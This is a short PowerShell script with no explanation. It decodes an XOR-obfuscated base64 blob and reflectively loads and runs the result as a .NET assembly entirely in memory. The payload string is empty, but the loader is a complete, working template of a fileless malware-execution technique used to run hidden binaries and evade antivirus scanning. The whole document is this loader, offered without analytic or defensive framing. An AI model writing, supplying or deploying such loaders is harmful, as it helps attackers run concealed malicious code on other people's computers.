$b64 = ""
$key = 220
$encrypted = [Convert]::FromBase64String($b64)
$decoded = @()
foreach ($byte in $encrypted) {
    $decoded += ($byte -bxor $key)
}
$assembly = [System.Reflection.Assembly]::Load([byte[]]$decoded)
$entryPoint = $assembly.EntryPoint
if ($entryPoint -ne $null) {
    $entryPoint.Invoke($null, @())
}
